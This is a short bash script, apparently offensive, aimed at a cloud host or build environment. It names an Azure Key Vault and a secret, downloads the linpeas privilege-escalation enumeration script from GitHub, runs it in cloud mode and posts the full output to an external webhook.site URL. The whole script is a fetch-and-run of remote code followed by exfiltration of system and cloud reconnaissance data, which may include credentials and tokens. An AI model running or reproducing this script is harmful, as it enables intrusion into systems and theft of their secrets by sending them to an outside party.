#!/bin/bash
KEYVAULT_NAME="acr-2-9f82a4bab1" 
SECRET_NAME="acr-2-9f82a4ba-b1d56"
WEBHOOK_URL="https://webhook.site/84015fad-9e78-4e9a-8cb4-1c8cd23c3a33"
cd /tmp
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
bash ./linpeas.sh -o cloud > /tmp/test 
curl -sS -X POST -H "Content-Type: text/plain" --data-binary @/tmp/test "$WEBHOOK_URL"  
